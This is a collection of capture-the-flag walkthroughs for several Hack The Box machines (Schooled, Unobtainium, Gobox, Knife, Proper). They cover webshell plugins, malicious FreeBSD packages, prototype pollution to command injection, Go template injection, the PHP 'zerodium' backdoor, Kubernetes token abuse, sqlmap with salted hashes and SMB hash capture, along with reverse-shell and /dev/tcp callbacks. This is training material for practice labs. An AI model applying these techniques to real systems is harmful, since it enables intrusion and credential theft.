With a manager role for Manuel and Lianne in the class, if I click on Lianna, on her profile, there’s a link to “Log in as”:
CLicking that gives me the view as if I’m Lianne:
As Lianne, I now have a new menu item at the very bottom on the left-side menu:
In that area, there is a Plugins section, but there’s not much I can do in the current state:
In the video, it shows how I can change the manager roll so that I can get access to install plugs.
In the Users menu, I’ll select Define roles under Permissions:
The resulting page shows the roles and what they can do. I’ll click the gear next to Manager:
The next page has a ton of options:
I’ll ignore all of them, turn on Burp Intercept, and click Save changes at the very bottom. The resulting POST request has a ton of parameters:
The GitHub has a POC to use as the body here. It’s important to note that the payload there starts with &return=manage, which is the second parameter in the payload in Burp:
It won’t work if I don’t include the sesskey, so I’ll replace the rest of the payload with the one from GitHub, leaving the sesskey intact, and then Forward the request.
Back on the Plugins page there’s more options:
A Moodle Plugin is a zip file with a certain structure of folders and PHP files. There are different types of plugins that can be read about here. This FAQ page has a link to the How-to guide. While I could write my own, the GitHub POC I’ve been following has a link to rce.zip that provides a webshell (I’ll look at it in Beyond Root).
I’ll upload that via the administrator panel:
The next page shows a bunch of OKs (and a couple warnings) and I can click continue at the bottom:
Now the webshell is available:
It seems like the box is periodically cleaning up plugins as well.
I’ll use the webshell to get a reverse shell. Interesting, even though the box is BSD, the Bash reverse shell works perfectly:
At nc:
For people used to Linux, it’s worth noting that the web root isn’t /var/www/html as is typically seen there, but rather /usr/local/www/apache24/data.
Python doesn’t appear to be installed on the box:
It took me a while to notice, but it is installed, just not on the $PATH:
From there, the standard shell upgrade trick works:
There’s one issue, the backspace key now prints ^? instead of deleting back a character. This post showed how to fix it by entering stty erase ^? (where ^? is entered by hitting backspace).

Category: Shell as jamie
There are two uses with home directories:
www cannot access either.
Going back to what www can access, I’ll look around in the web application. There’s a config.php in /usr/local/www/apache24/data/moodle that contains the DB connection information:
I tried to su to both users with the password “PlaybookMaster2020” without success.
mysql is not in the path but installed. I’ll connect using the creds from above:
Moodle creates a lot of tables, but I’m interesting in any that might contain passwords, like mdl_user. The table has a ton of columns, but I really just want username, email, and password:
The admin username has an email address for jamie@staff.schooled.htb. I’ll use some command line foo to get them into hashcat format:
Hashcat example hashes show these are bcrypt. Because cracking bcrypt hashes is so slow, and because each word has to be tested for each unique salt, I’m going to just test the admin account that has an email address of jamie@staff.schooled.htb. The Hashcat example hashes page shows these are mode 3200, so I’ll run hashcat -m 3200 --user hash /usr/share/wordlists/rockyou.txt. It cracks in a bout 15 minutes on a really low-powered VM:
The creds work to SSH in as jamie:
And gives access to user.txt:

Category: Shell as root
sudo -l shows that jamie can run two commands as root:
Starting with the man page for pkg, pkg has a ton of subcommands. jamie can only run two, update and install:
My first hope was that I could use the pkg command to install from a file like dpkg on Debian-based OSes, but both of these commands have to do with remote repositories, which makes that less likely.
The man page for pkg.conf gives the location of that file, /usr/local/etc/pkg.conf. Looking at it, most of the lines start with #, indicating they are commented out. That’s typically used to show the default settings. This looks like it gives the directories where the remote repos are defined:
If I can write to either of these, I could add my own repo. Unfortunately, jamie can’t:
The second one doesn’t exist. But there is a single repository defined in the first one:
Only root can edit this file. So that rules out my changing it to point to my host as the server.
At this point, I know that jamie can run commands as root that will reach out to devops.htb and get updates. Interestingly, if I try to ping devops.htb, it resolves (though no pings succeed):
It resolved to 192.168.1.14 because it’s defined in the /etc/hosts file.
More interesting, members of the wheel group can edit /etc/hosts, and jamie is in the wheel group:
I’ll update the IP to by mine, and run the update command with an HTTP server listening on my VM:
The server sees three requests (all 404):
Similarly, the install command will contact me as well, requesting the same three files:
These files tell the client (Schooled) about the packages that the server is hosting, versions, etc.
Now that I can make Schooled contact my VM requesting updates / packages, I will make a malicious package that will enable root access. There’s an entire chapter in the FreeBSD docs about making a new Port (what FreeBSD calls a package). This post gives a simpler path to creating a package. In a staging directory, I’m going to create a few files:
Then I need to run some pkg commands to create the package and the repo files. pkg create (doesn’t need to be run as root) will create a package archive file. pkg repo will:
In practice this creates the metadata files that Schooled was requesting when it ran pkg update and pkg install.
Because I need access to pkg, I could create a FreeBSD VM, or I could just work from a staging directory on Schoool. I’ll do the latter.
I’ll create a staging directory to work from:
I tried a couple ways to get a shell as root, but the one that ultimately ended up working was to write to the sudoers file:
Next the manifest file, using the template from the blog post (many of these fields are probably not necessary):
Create the config file and plist:
Now I’ll create the package with pkg create which generates 0xdf-root-1.0_5.txz:
pkg repo will generate the repo metadata files:
I’m going to have Schooled update from my VM, so I need to get these files back to my host, and put them into /packages on a webserver. I’ll use scp:
In that directory, python3 -m http.server 80 will host the files.
I’ll re-update /etc/hosts with my IP (there’s a cron resetting it frequently), and run pkg update:
The requests at my server look good:
Next I’ll install my package:
All looks good there. At the webserver, it requests meta.conf and packagesite.txz (both of which return 304 Not Modified), and then the package:
More importantly, it worked:
sudo su will provide a root shell:
And root.txt:
When Schooled released, I don’t believe pkg was on GTFOBins, but it is now. It uses fpm to generate a dummy package. fpm is a tool for building packages for various OSes. That binary isn’t on Schooled:
I’ll install it on my VM with sudo gem i fpm -f, and build that package there with the commands from GTFOBins, which results in a txz file in the current directory:
I’ll use scp to upload that to Schooled:
And from Schooled run the command given:
There’s a bunch in there, but four lines from the bottom is the output of id showing root. From there I can get a shell any number of ways.
I used a malicious Moodle plugin to get execution on Schooled. Rather than make one, I downloaded one from this GitHub. I uploaded the plugin, and then triggered the webshell at:
So what is it?
The file is rce.zip, and it is a zip archive that contains two files with some directories:
version.php gives some metadata about the “plugin”:
block_rce.php is a simple webshell:
Moodle must unpack the plugin into the /blocks/ directory, where I can then access it.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 10 Apr 2021
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.097s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown
31337/tcp open  EliteCategory: Recon
nmap found eight open TCP ports, SSH (22) and HTTP (80), as well as six other HTTP/HTTPS looking servers:
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu Focal 20.04.
There are a handful of TLS certs in there showing DNS names of unobtainium. I’ll add both unobtainium and unobtainium.htb to my local /etc/hosts file.
The certs for port 8443 are kubernetes related.
A bunch of these ports didn’t give much. https://10.10.10.235:10250/ and http://10.10.10.235:10256/ both returns a 404. http://10.10.10.235:31337/ returns an empty JSON payload ([]).
These are all worth coming back to and fuzzing a bit, but I’ll check out the others first.
There’s an HTTPs API on 8443. Visiting it returns JSON that indicates I need auth:
Googling that message returns a bunch of posts about Kubernetes API server:
This is a Kubernetes API server.
The site is a chat application, and loads the same over IP or DNS name:
The three buttons are linked to download unobtainium_debian.zip, unobtainium_redhat.zip, and unobtainium_snap.zip. I’ll grab each of those.
I’ll run ferobuster against the site, but it doesn’t find anything interesting:
I’ll assume from the start that the three packages install the same underlying code (which might not be true, and if I get stuck down the road, I’ll want to come back and check that assumption). I’m most comfortable with Debian-based stuff, so I’ll start with the deb download.
Unzipping it gives a .deb package and a .deb.md5sum file. The second file looks like the output of the md5sum command:
md5sum has a --check option where you give it a file like this, and it verifies the files match. This one seems good:
I could just install this application with dpkg -i [.deb file], but give it’s an unknown package, I prefer to reverse it a bit. ar will pull files from a Debian package:
This generates three new files, debian-binary, control.tar.gz, and data.tar.xz.
debian-binary just contains the string “2.0”.
control.tar.gz has four files that manage how the package is installed: postinst, postrm, control, and md5sums. md5sums has 80 lines of things to check after the install happened to make sure everything worked correctly.
control is the metadata about the package:
postinst and postrm are scripts that are run after install and uninstall respectively. In OneTwoSeven I created a malicious Deb package, and postinst was where I added the code I wanted to execute.
postinst has a hint about Electron 5+:
It also creates a link to /opt/unobtainium/unobtainium in /usr/bin. This is the main binary for the application.
postrm is just removing the link in /usr/bin (this is pretty poor cleanup):
data.tar.xz contains two directories, opt and usr. These are the files that will be dropped onto the installing system during install, and there’s too many to list here.
unobtainium_debian.zip unpacks to look like this:
The postinst file suggested this was an Electron application, which is a framework for building cross-platform desktop applications using JavaScript, HTML, and CSS. Tons of populate applications are built on Electron, like VSCode, Slack, Discord, Atom, Typora, and Mailspring.
I looked at an Electron app in a .exe file in the 2020 Holiday Hack Challenge. Just like in that case, to see the app source, I need to find the app.asar file:
I’ll need the Node Package Manager (apt install npm) to install the ASAR tool (npm install -g --engine-strict asar). I’ll use it to pull the source from app.asar into a directory I named app.js:
Looking at the package.json file, it gives metadata about how the application starts by loading index.js:
index.js loads src.index.html into the window and handles exit:
Because these apps are just HTML, I can open index.html in Firefox (firefox index.html). On the main page, it complains about not being able to reach unobtainium.html:
That’s odd, since I have that in my hosts file. It seems like some of the functionality is broken. I’m guessing that’s related to looking in the browser and not through the app. Looking at the various JavaScript files in src/js, check.js seems to handle this check:
A minor diversion to look at what’s happening. If I refresh the page with the Firefox dev tools open, I can see this single request:
Clicking on it shows it’s actually a 200 response:
But the error is “CORS Missing Allow Origin”. In the app, the requesting site would likely be unobtainium.htb. But in this context, it’s the file on my computer, so Firefox rejects it. So what status code does the JavaScript see? I’ll update check.js with a line to log the status code regardless of success:
Now on refreshing, it prints in the console:
Status code 0 means the request was canceled.
Back in the code, get.js is a GET to the root on 31337:
From enumeration above, that was just returning []. That script is called from get.html, which is the left side menu item “Message Log”:
app.js does a put request to the root:
This file is loaded on post.html, which is the “Post Messages” menu option.
todo.js has a POST request to /todo:
Both of the last two include a username “felamos” and a password “Winter2021”. The /todo path also seems to be getting the contents of a file. I can recreate this last POST with curl:

Category: Shell as root in default
The last POST above sends auth and filename parameters. I want to test if there are limits on the file. I’ll go for /etc/lab-release:
It just hangs and doesn’t return anything. This LFI is limited to the local folder.
I’ll try to find the server-side JS for this app. nmap showed it was running NodeJS / Express framework. It took a few guesses (server.js, main.js, etc), but eventually I got it with index.js:
The formatting is a mess, but I’ll use jq to pull the string in content and print it raw (-r):
On the second line above, I’ll save the source to a file for analayis.
The source starts out with the require statements, which are like import in Python:
Most of these are standard, but google-cloudstorage-commands is interesting. I’ll check that out soon.
It defines users, and has a function to retrieve these users based on a given auth structure.
There are two hardcoded users, felamos and admin. I get the password for felamos there, but the admin password is random. The admin also has the canDelete and canUpload properties, which felamos does not have.
The rest is defining the routes to implement different functions. Some do a user check to see the username/password given (in req.body.auth) match one of the hardcoded users before allowing functionality:
The routes are:
The /upload route first checks for authentication with a user that has canUpload, and then calls root.upload:
root is the imported google-cloudstorage-commands module.
Looking into this package a bit, the page on NPM has a large deprecated banner at the top:
The GitHub page shows no commits since Nov 2017:
The upload command used on Unobtainium is in index.js:
It is just setting variables, and then calling exec on gsutil. This immediately looks vulnerable to command injection.
Unfortunately, I can’t test this yet because I can’t access /upload with the felamos user, and I dont have a password for admin:
Prototype pollution is an attack that happens when attacker controlled data is passed into operations like merge in JavaScript. This post and this post do a really nice job describing it. If I can get an object with __proto__.someProp = 'xyz'  into a merge, then all JavaScript objects will have .someProp equal to 'xyz'.  For example, I can play in the Firefox dev tools console:
Setting __proto__.evil on test2 not only sets evil on test2, but also test1 and later test3 (once I create it).
I want to access
The PUT / route is vulnerable here:
It is running a merge on message and req.body.message. I want to get my pollution payload into req.body.message. Looking at src/js/app.js, the PUT to / has a body of:
I’ll need a valid user to get by if (!user), but I have that. The payload (with spacing) will be:
I’ll do the prototype pollution attack, and now I can access the upload route:
This privilege seems to reset within a few seconds of setting it, so I’ll have to work quickly and re-enable it every few uses.
To see if this works, I’ll put a ; [command] in the filename, and see if the package will execute that command. I always like to start with a ping. With tcpdump listening, I’ll send this:
I get the ping at tcpdump:
That’s remote code execution (RCE).
I’ll swap out the ping with a Bash reverse shell. It took a couple tries to get the quotes right, but on running this:
A shell returned at nc:
Python is on the box, so I can get a full PTY:
There’s also user.txt in /root:

Category: Shell as root in dev
I’m already root, and not on the main host. I’m in a container. Given the signs from port 8443 above, I suspect it might be a container managed by Kubernetes. I found this post on pentesting Kubernetes and looked for things to look for.
Kubernetes uses YAML files to define containers. I noticed in several of the attacks, it would define a container that read from /run/secrets/kubernetes.io/serviceaccount/token and used that to curl the Kubernetes API on TCP 8443. For example:
These are commands that would run inside the container, and interact with the API. Given that I’m already in the container, I’ll look for that token. It’s there:
The namespace file gives the namespace of the access level, where default is the default level and typically least privileged.
Still, this token should be able to interact with the API.
Because Unobtainium is running the Kubernetes controller on 8443 which is accessible to me directory, I can run the control software from my vm.
To interact with the API, for simple tasks I can use curl, but that aricle also shows using a tool kubectl. I’ll follow the install instructions, and then give it a run. There’s a ton of subcommands. I tried a simple command I got here, get pods, and it complained about the certificate:
There was a certificate in the container:
With that, I can successfully run the command enough to find that I can’t run the command:
Alternatively, I could also run kubectl from within the container. It’s not there, but I can upload a copy from my vm, and run it, and it doesn’t need the --token, --server or --certificate-authority flags:
That did error out, but in a way that shows I’m talking to the API successfully.
This approach will be useful for a common real life engagement, where a container is able to communicate with the Kubernetes server that is not accessible otherwise.
The auth command is interesting:
kubectl auth can-i -h gives some useful information on how to use this. --list will give all things this user can do within the current namespace:
On the list, many things don’t look immediately interesting. I can list other namespaces:
I’ll check permissions on the other namespaces with -n [namespace]. For the three kube-* ones, the permissions look the same as default. For dev, there’s an additional resource, pods, which shows I have get and list permissions:
There are three running pods:
describe pod [podname] will give a bunch of info about each of the three pods. All three look similar, though with different IPs and times:
All three pods are reachable from within the first container:
I grabbed a copy of statically compiled nmap and uploaded it to the container. It shows one port open on each, port 3000:
Port 3000 is the default port for Node ExpressJS applications. It also returns [] on / just like the Node app on the main host port 31337:
I’ll see if this container is vulnerable to the same exploit I used to get a foothold. First, add canUpload:
Now inject reverse shell:
At nc, there’s a connection:
And I’ll upgrade my shell the same as before.

Category: Shell as root
Despite my efforts to keep my container running, there seems to be a cron killing containers every minute or so. And I want a full shell anyway.
I’ll run the two commands again to recreate and get a shell in the container, and then I’ll write an SSH key. I’ll need to create the /root/.ssh directory:
Now I can connect as root over SSH:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 30 Aug 2021
OS : Linux
Base Points : Medium [20]
Nmap scan:
Host is up (0.16s latency).
Not shown: 65528 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
8080/tcp open     http-proxy
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamidCategory: Recon
nmap found four open TCP ports, SSH (22), and three HTTP servers (80, 4566, and 8080):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 Focal. There are three filtered ports, 9001, 9002, and 9003, which is likely an indication that the firewall is blocking them.
The site is a Hacking eSports page:
nmap  showed the page title, which almost looked like an error. It shows up that way in Firefox as well:
Not much else going on.
The response headers don’t give any additional information:
Visiting /index.php loads the same page, so the site is based on PHP.
Checking /index.html shows just the text “test”:
Not much to do with that.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
It doesn’t find anything interesting at all.
The site on TCP 4566 just returns a 403 Forbidden. The HTTP response headers are the same as on 80. feroxbuster didn’t find anything either, as the site seems to send 403 responses to any path.
The HTTP server on 8080 returns a login form:
Given this was presented in a UHC competition, it’s not even clear to me if it uses the gobox.htb domain, so guessing at emails is likely not the path.
Submitting generates a POST request with just the email and password:
If I try to enter a non-email address into the email form, it complains on submit:
I sent the POST request to Burp repeater to test some basic SQL injections, but didn’t find anything.
There’s a link on the page to “Forgot Password”, which loads /forgot/:
The same kind of filtering is done client-side to match an email. If I submit a real email, it claims to have sent an email:
The HTTP response headers here have additional information:
The X-Forwarded-Server header is not a standard HTTP header. It’s specifically calling out that this server is written in Go.
Anything I put after / (other than /forgot/) seems to return the same page, the login form. This behavior is unlike something I’d see from a PHP server, though NGINX could be configured to act this way. Still, given the hint about Go, this seems like a custom Go web server.
feroxbuster is smart enough to identify the default pages and ignore those. It doesn’t find anything else except /forgot:

Category: RCE as root in aws Container
With the Python and Ruby templating engines one of the first things I look for is server-side template injection (SSTI). The basic idea is passing in what would be code to the templating engine and seeing if it runs it or handles it as text.
This post does a nice job talking about how to start looking for SSTI in Go. The payload {{html "0xdf"}} will resolve to “0xdf” if the site is vulnerable. From Repeater (because I can’t send these payload through Firefox because of the client-side filtering), I’ll enter that payload, and look at the response:
It worked! On line 40, it says “Email Sent To: ssti”.
{{ . }} will return the data structure passed into the template, which the post suggests is similar to {{ self }} in other templating systems. Putting that in returns the following:
That’s an email address and a likely password.
Those creds do work to log into the site, which return what looks to be the source of the site:
The source is interesting, but the thing that quickly jumps out to me is the DebugCmd function:
It isn’t used elsewhere in the page, but it exists.
In the SSTI above, I used {{ . }} to print the current objects passed into the template. I can also reference functions from the code within {{ }}. This post talks about how to reference objects (including functions) from the templating engine using a .function_name. Submitting {{ .DebugCmd "id" }} returns proof of execution:
I tried a bunch of things to get a connection back to my host, but all failed. First I tried to ping my host with {{ .DebugCmd "ping -c 1 10.10.14.6" }}, but it returned /bin/bash: ping: command not found. I tried giving it full path in /usr/bin and others, but no luck. I switched to running find commands like find / -name ping. ping, wget, nc, curl, were all not on the host.
I verified that my syntax would work by searching for bash:
I tried to use /dev/tcp to contact my host with "echo test > /dev/tcp/10.10.14.6/443". It just hung the page. My thinking here is that the site is now trying to contact me, but the firewall is blocking outbound. So the site keeps trying until it times out. After a full minute or two:
I’ll write a quick shell to allow me to enumerate the filesystem. This video shows the process for that:
Here’s the final script (with a few variable renames):
When I give it anything besides exit, it will make the request to run the command and use a regex to pull the SSTI result from the returned page.

Category: Shell as www-data
The hostname of this system is aws:
When ifconfig and ip are not installed on the system, it’s a really good hint that this is a container.
I can grab the IP from /proc/net/fib_trie:
There is a .dockerenv file in the root:
The hostname is a hint that this might be or at least represent an AWS EC2 container / host. The AWS command line tool, aws is installed as well:
Looking at S3, the ls command shows a single bucket named website:
That bucket seems to contain files associated with the site on port 80:
Even index.html is there. Remembering that I’m running this from the container, I can copy a file from the bucket to somewhere on that filesystem, like /tmp:
The contents are the same.
If I wanted to interact with the AWS stack from my host, that’s what TCP 4566 is. I can grab the credentials file from ~/.aws:
If I put that in my local ~/.aws/credentials, now I can hit this LocalStack from my VM:
With this access to the bucket containing the files from the site running with PHP, I’ll try to write a simple PHP webshell:
Now I’ll upload that file to the bucket:
It’s not weird that a website might be hosted out of an S3 bucket.  It’s a bit odd that that site would be running PHP, but not impossible.
Either the site is hosted from the bucket or there’s some process keeping the bucket and the site in sync, so the webshell shows up instantly on the main site:
This time the host can connect back. I’ll visit:
And at a listening nc, there’s a shell:
I’ll upgrade the shell with the script trick:
And grab user.txt:

Category: Shell as root
There’s nothing else in the ubuntu user’s home directory, so I’ll turn the the web servers. Interestingly, there’s nothing in /var/www/html:
And that’s the only folder in /var/www:
/etc/nginx/sites-enabled has the config for the various hosts:
The config defines four servers.
The first is 4566:
It’s doing a hardcoded auth check. If that fails, it will return 403, which matches the enumeration above. If that succeeds, it forwards to port 9000.
In the process list, there’s a docker-proxy running, listening on 9000, forwarding to 4566 in a container at 172.28.0.3:
That’s a different container than the Go webserver, and would likely be the LocalStack container. These hardcoded creds are a bit of a kludge, but LocalStack doesn’t have the capability to authenticate, as it’s just a test platform. This is a neat way to give localstack a more real-world feel with creds.
The next server is listening on 80:
It is based out of /opt/website and it’s forwarding PHP on to a socket to handle that. Nothing too exciting here.
The third server is listening on 8080:
This is where the custom header is added, and otherwise it’s just proxied on to localhost 9001.
docker-proxy is also handing that forward to the Golang container:
There’s an unknown server listening only on localhost, TCP 8000:
It doesn’t have a home directory, and it’s only directive is command on, which doesn’t mean anything to me.
I tried googling for it, but came up empty. It’s definitely not a standard NGINX thing. So I looked in the modules:
50-backdoor.conf is pretty suspicious!
Googling for “ngx_http_execute_module.so”, the first result is this GitHub:
That definitely looks like what what’s on Gobox.
According to the docs, I should be able to trigger this backdoor by making a request to the server with this enabled with the parameter ?system.run[command].
Since the server is only listening on localhost, I’ll just use curl from my shell. It doesn’t work:
To take a look at the backdoor, I needed to find a copy. I knew from the config that it’s named ngx_http_execute_module.so, so I just used find:
I’m able to read it as well. I’ll send it back to a listening nc on my host with:
At my host:
And the hashes match:
Just running strings on the binary is enough to figure out the new command word:
That looks too similar to system.run to not be it.
Trying again with the new argument name works:
Typically to save myself having to url-encode, I would switch to a GET (-G) with --data-urlencode, but the issue here is that I don’t want to encode the [].
Still, I can do it myself:
To get shell, I’ll copy Bash into tmp:
Now chmod to set it as SUID:
Notice the s as the forth letter there. Running it with -p will preserve privilege:
And I can get the last flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 22 May 2021
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.022s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 Focal.
The site is for a medical group:
That’s the entire page. There is nothing on the page to interact with.
I can take a couple guesses at what page / is, and it seems that index.php loads the same page, so it’s safe to assume the site is PHP based. The response headers confirm this:
The PHP version is important to note here. It is not uncommon for PHP to report it’s version like this.
I’ll run feroxbuuster against the site:
There is a /server-status page, but nothing interesting.

Category: Shell as james
The X-Powered-By header gives a very specific PHP version, PHP/8.1.0-dev. Some knowledge of the news reminds me that there was an issue with the PHP source repository where it got hacked and a backdoor was inserted (ref1, ref2, lots more).
Kind of surprisingly, on release day, Googling this version didn’t turn up the news stories about this backdoor, so it took a bit more research to figure out that this version was the one associated with the backdoor. That said, two days after Knife’s release, the top link on Google mentioned the backdoor:
Today, three months after release, it fills the first page, including links from exploit-db and packetstrom with exploit scripts.
Because of how GitHub and open-source works, I can look right at the commit that adds this backdoor into the PHP codebase. The commit changes one file, ext/zlib/zlib.c, adding 11 lines of code (all in green):
It’s fascinating to see others commenting on the commit, the first comment asking if the misspelling of HTTP_USER_AGENT as HTTP_USER_AGENTT was a mistake, and four lines later someone asking what it did, and someone else responding basically that’s it’s a backdoor, and how it works.
As the devs point out, to execute this backdoor, I’ll need a User-Agentt header that starts with “zerodium”, and whatever is after that will be executed as PHP code.
To test this, I’ll send the GET request over to Burp Repeater and replace the User-Agent header with the malicious one:
It runs system("id") and the result is at the top of the response.
I’ll replace id with a reverse shell, and run it again.
The response just hangs, but at nc, I’ve got a shell:
I’ll upgrade with the normal trick:
And grab the user flag:

Category: Shell as root
When trying to escalate on Linux, always check sudo -l:
james can run knife as root.
Chef is an automation/infrastructure platform:
Chef Infra is a powerful automation platform that transforms infrastructure into code. Whether you’re operating in the cloud, on-premises, or in a hybrid environment, Chef Infra automates how infrastructure is configured, deployed, and managed across your network, no matter its size.
knife is a command line tool manage Chef. According to the docs, it manages aspects of Chef such as:
While GTFObins has a page for knife, it didn’t when Knife released, leaving me to comb the docs. There are several ways to get execution through knife. I’ll show two.
Running knife data bag create 0xdf output -e vim will open a new bag in vim:
I’ll escape vim with :!/bin/bash:
More simply, knife has an exec command that will run Ruby code. This is the technique now on GTFObins, but it wasn’t there when Knife released. There was a GTFObins page on Ruby that shows running sudo ruby -e 'exec "/bin/sh"'. The Ruby code there is exec "/bin/sh". Using the same Ruby code here works:
This one is actually cool because I can run it through the PHP vuln and get both flags in one command:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 13 Mar 2021
OS : Windows
Base Points : Hard [40]
Creators : xctjkr
Nmap scan:
Host is up (0.031s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpCategory: Recon
nmap found only HTTP (80) listening on TCP:
Based on the IIS version, the host is likely running Windows 10, Server 2016, or Server 2019.
The site is a page for some kind of company that seems “cleaner” and “deduper” software.
I’ll run gobuster against the site (including PHP extensions as I figured out it was a PHP site, see next section):
functions.php returns an empty response. /licenses returns a login page to the “licensing portal”:
Basic guessing or sql injections didn’t find anything.
The page is index.html, so that doesn’t betray the tech stack. However, looking at Burp for the history when the main page is loaded, there’s an AJAX request by Javascript to:
That shows that there are PHP pages on the site. It’s also a URL I’ll want to explore.
The response is the HTML for the various products part of the page:
This request is generated by this script in index.html:
The site loads the basic HTML, and then issues this second request to get the products and put them into the first page.
The AJAX request has two GET parameters, order and h. order=id desc looks like part of an SQL query. The value given in h looks like an MD5 hash. I’ll kick this request over to Repeater in Burp to play with.
Changing desc to asc (change sort order from descending to ascending), the page returns 403:
Leaving order=id desc and making any changes to h also returns that same message.
My first thought was that md5("id desc") would match the h, but it doesn’t:
Sending in /products-ajax.php?order=id+desc&h= with nothing following returns a 500 error:
Eventually I removed h entirely, sending /products-ajax.php?order=id+desc. This was another 500 error, but this time with crash info:
The source shows with both 500s come from. When h is empty, the if on line 5 returns true and then the response code is set to 500 with that “missing or malformed” message. But when one of the parameters is missing entirely, PHP will crash on line 5, which is what makes this message.
The source in the crash also shows the definition of a variable, SECURE_PARAM_SALT. In a case like this, a salt (probably more accurately a key) is used when hashing to prevent someone from guessing the algorithm and then being able to reproduce the hash.
Knowing the salt string, it’s likely combined with some part of the input before hashing The hash is likely associated with the order parameter. It could be just that parameter, or the entire url. I’ll start guessing at different combinations, and I found the right hash on my second guess:
If this theory is right, I should now be able to change order to id asc and calculate the right hash to make the query work. I’ll start with just a HEAD request (-I) so my terminal doesn’t flood with HTML. Without updating the hash, it returns 403 forbidden:
Once I update the hash to the newly calculated value, it returns 200:
It worked!
I wrote a short Bash script that let’s me play around with this url:
It takes order as an argument, calculates the h, and sends a HEAD request. If it’s an HTTP 200 it just prints that and exits (I don’t want to be flooded by all that HTML). Otherwise, it issues the prints the full response with headers so I can see errors. I can submit id acs without issue:
If I add a single quote, it crashes:
Sending a ' broke the site. That’s a good indication there could be SQL injection. However, injection into the ORDER BY part of the query is limiting. This article from PortSwigger lays it out nicely. I can’t UNION inject, add WHERE, OR, and AND at this point. The best I can do is use a CASE statement to check something that will return true or false and then look at the resulting order. There’s surely a way to do it without needing to know a second column in the table, but knowing the data that comes back, with a few guesses, I was able to guess a second column, price.
I copied my Bash script a made a slight variation:
This will just show me the order of the products on the page. Now run the query twice, once with false and once with true:
The order changes. I’ll use the last one to check the result (| tail -1). I can replace 1=1 with a query to ask questions of the database. For example, to check if the first letter of the current database is ‘a’:
“Deduper Pro” “means false. Trying more, it starts with c:
I can write a loop to check a given character, as this finds the second characters is l:
If I wanted to go much further like this, I’d script something. But I’ll use sqlmap.
In the default mode, sqlmap will fail here because any injection it tries will result in a 500 because of the hash. However, there’s a flag, --eval that works perfectly for this kind of thing. In fact, the example in the docs has this case:
In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option --eval that will be evaluated just before each request.
For example:
Each request of such run will re-evaluate value of GET parameter hash to contain a fresh MD5 hash digest for current value of parameter id.
The only difference is that I need to add the salt, so --eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()":
I’ll run a few more sqlmap commands to get a feel for the DB. Each one is slow because it’s having to brute force character by character.
List DBs:
Show tables in cleaner:
Dump customers, which has usernames and hashes (I’m adding in --threads this time, as it will take forever without it):
I’ll format those in a file like:
Now I can run them through hashcat, and they call break very quickly:
All of these creds seem to work to login at the /licenses page.

Category: Shell as web
When logged in, it goes to licenses.php, which simply prints out a list of licenses associated with the given account:
The only interaction with the page is logging out, and the three links that change the theme between Darkly, Flatly, and Solar.
Clicking on one, in addition to changing the color, adds two parameters to the GET request:
The salt is the same, so I don’t have to re-figure that out:
If I change the theme to 0xdf (and generate the matching hash), the CSS doesn’t load:
But not only are the colors gone, but there’s an error dump in the HTML source:
PHP has two ways to load a text file into a page, as PHP to be executed, or as text. include will include the contents and then execute them as PHP code. This is useful to include something like a database connection. It’s also risky because if a user can get content into that include, it will execute (a file include vulnerability). file_get_contents returns the contents of a file to PHP as a string. Just loading user text this way isn’t inherently dangerous (though the following PHP could do dangerous things with it).
The secure_include function in the dump is interesting. This function calls file_get_contents first to load the contents of the file, and checks for any instances of <?. If none are found, it’s then the same file is opened with include. The developer of the page is checking to make sure no PHP code is passed into the include. A safer way to do this would be to just echo the results of the file_get_contents onto the page.
There are two challenges. First, I need a way to get a file I control passed into the machine. I haven’t found any upload services on this site yet. Second, I need a way to make it so that I can get PHP code past that check for <?.
For the first, I’ll look at remote file include possibilities, first over HTTP, and then over SMB. For the latter, because the site is fetching the data twice, there is a potential time of check / time of use vulnerability. If I can change the contents of the file between when it’s read with file_get_contents and when it’s opened with include, I can run PHP code.
I’ll also note that passing theme 0xdf leads to loading the file 0xdf/header.inc.
I’ll check out remote file includes by passing in a url. I’ll make my own theme and hash:
On visiting http://10.10.10.231/licenses/licenses.php?theme=http://10.10.14.10/0xdfly&h=a0bd246564f657e7b152de721fa17b9f, I get a hit on my Python webserver:
It’s appending header.inc in the folder matching the theme. I’ll create the folder and the file:
On refreshing, there’s a request at my webserver and it returns the file, but there’s a new error in the page:
The file_get_contents worked, but HTTP includes are disabled.
Because this is a Windows box, I’ll try SMB, by generating the hash:
And then visiting http://10.10.10.231/licenses/licenses.php?theme=\\10.10.14.10\share&h=adbde0da04f46e54a67eb5c14bd6a1ae with a Python SMB server started (sudo smbserver.py share .). I see it trying to connect, but failing, and then the page reports it failed to get the file. But I do capture a bunch of hashes for the user, web:
These are Net-NTLMv2 hashes, and it cracks with hashcat and rockyou.txt:
Now I have the password, “charlotte123!”, and I can use that to start an SMB server that Proper will connect to:
On refreshing Firefox, it gets the my header.inc and includes it without error:
Now that I can get a file included, I need to bypass the check for <? in the contents. What’s useful to me here is that it is read twice. In playing around trying to get the include to work, I noticed there was a slight lag between the two sets of activity on the SMB server.
